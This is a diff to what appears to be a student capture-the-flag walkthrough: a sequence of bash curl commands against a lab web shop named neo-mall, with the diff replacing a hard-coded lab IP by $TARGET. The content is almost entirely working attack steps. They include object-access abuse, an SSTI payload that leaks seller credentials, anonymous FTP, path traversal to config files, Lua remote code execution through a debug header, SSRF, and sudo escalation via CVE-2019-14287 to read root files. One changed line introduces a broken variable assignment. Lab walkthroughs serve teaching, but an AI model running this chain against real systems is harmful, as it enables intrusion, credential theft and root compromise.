@@ -8,7 +8,7 @@
 ```bash
 # TARGET為攻擊機IP
 $TARGET
-export TARGET=192.168.17.133
+export TARGET=$192.168.17.133
 
 #設curl=jcurl+讀懂中文編碼的指令
 alias jcurl='curl -s | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d, ensure_ascii=False, indent=2))"'
@@ -21,10 +21,10 @@ alias jcurl='curl -s | python3 -c "import sys,json; d=json.load(sys.stdin); prin
 
 ```bash
 # BOLA - 存取隱藏商品 id=0
-jcurl http://192.168.17.133:8080/api/products/0
+jcurl http://$TARGET:8080/api/products/0
 
 # 查看 /system-status/ 原始碼，找 HTML 註解中的 debug 介面線索
-curl -s http://192.168.17.133:8080/system-status/
+curl -s http://$TARGET:8080/system-status/
 ```
 
 ---
@@ -33,25 +33,25 @@ curl -s http://192.168.17.133:8080/system-status/
 
 ```bash
 # 用 guest 登入取得 session cookie
-curl -s -c cookies.txt -X POST http://192.168.17.133:8080/api/login \
+curl -s -c cookies.txt -X POST http://$TARGET:8080/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"guest","password":"guest123"}'
 
 # 取得 guest 的邀請碼
-jcurl -b cookies.txt http://192.168.17.133:8080/api/user/me
+jcurl -b cookies.txt http://$TARGET:8080/api/user/me
 
 # 用邀請碼註冊正式帳號
-curl -s -X POST http://192.168.17.133:8080/api/register \
+curl -s -X POST http://$TARGET:8080/api/register \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker","password":"Attack123","confirm_password":"Attack123","email":"attacker@evil.com","invite_code":"INVITE-GUEST-2024"}'
 
 # 用新帳號登入
-curl -s -c cookies2.txt -X POST http://192.168.17.133:8080/api/login \
+curl -s -c cookies2.txt -X POST http://$TARGET:8080/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker","password":"Attack123"}'
 
 # SSTI payload - 打出 app_config 拿 Seller 帳密
-jcurl -b cookies2.txt -X POST http://192.168.17.133:8080/api/reviews/add \
+jcurl -b cookies2.txt -X POST http://$TARGET:8080/api/reviews/add \
   -H "Content-Type: application/json" \
   -d '{"product_id": 1, "comment": "{{ config }}"}'
 ```
@@ -62,16 +62,16 @@ jcurl -b cookies2.txt -X POST http://192.168.17.133:8080/api/reviews/add \
 
 ```bash
 # Seller 登入
-curl -s -c seller_cookies.txt -X POST http://192.168.17.133:8080/api/login \
+curl -s -c seller_cookies.txt -X POST http://$TARGET:8080/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"neo_vendor","password":"VendorPass8899"}'
 
 # 上傳假 PDF 洩漏絕對路徑
-jcurl -b seller_cookies.txt -X POST http://192.168.17.133:8080/api/seller/upload \
+jcurl -b seller_cookies.txt -X POST http://$TARGET:8080/api/seller/upload \
   -F "file=@/dev/null;type=application/pdf;filename=test.pdf"
 
 # 匿名 FTP 下載備份日誌
-ftp -n 192.168.17.133 21 <<EOF
+ftp -n $TARGET 21 <<EOF
 user anonymous anonymous
 get backup_logs/server_migration.bak
 bye
@@ -79,10 +79,10 @@ EOF
 cat server_migration.bak
 
 # 路徑穿越讀取敏感檔案（直打 Port 8081 繞過 Gateway）
-curl -s --path-as-is "http://192.168.17.133:8081/assets-library/../../../site-b-dev/configs/deploy_note.txt"
-curl -s --path-as-is "http://192.168.17.133:8081/assets-library/../../config/secret_flag.txt"
-curl -s --path-as-is "http://192.168.17.133:8081/assets-library/../../config/users.json"
-curl -s --path-as-is "http://192.168.17.133:8081/assets-library/../../config/server_config.json"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../../../site-b-dev/configs/deploy_note.txt"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/secret_flag.txt"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/users.json"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/server_config.json"
 ```
 
 ---
@@ -91,15 +91,15 @@ curl -s --path-as-is "http://192.168.17.133:8081/assets-library/../../config/ser
 
 ```bash
 # 確認介面存在
-curl -s http://192.168.17.133:8080/api/debug-system
+curl -s http://$TARGET:8080/api/debug-system
 
 # 確認執行身份
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("id"):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 
 # 確認可以打到 neo-mall 內網
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s http://neo-mall:8080/api/system/info"):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 ```
 
 ---
@@ -109,11 +109,11 @@ curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s http://neo-mall:8080/api/syst
 ```bash
 # 確認 diag API 可用，測試 whoami
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"whoami\\\"}\""):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 
 # CVE-2019-14287 確認提權成功
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 id\\\"}\""):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 ```
 
 ---
@@ -123,13 +123,13 @@ curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/
 ```bash
 # 生成 Flag（學號換成自己的）
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 
 # 讀取 Root Flag
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c \\\\\\\"cat /root/root_flag.txt\\\\\\\"\\\"}\""):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 
 # 讀取 User Flag
 curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
-  http://192.168.17.133:8080/api/debug-system
+  http://$TARGET:8080/api/debug-system
 ```
